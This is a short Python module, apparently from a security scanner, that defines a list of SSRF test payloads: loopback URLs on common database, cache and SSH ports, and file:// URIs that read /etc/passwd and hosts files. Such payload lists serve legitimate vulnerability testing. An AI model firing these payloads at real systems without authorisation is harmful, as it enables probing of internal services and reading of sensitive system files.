"""Пейлоады SSRF: исходные наборы и порядок проверок сохранены."""

from typing import Final

SSRF_PAYLOADS: Final[list[str]] = [
    "http://127.0.0.1:22",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:5432",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:11211",
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///windows/system32/drivers/etc/hosts",
]


__all__ = ["SSRF_PAYLOADS"]
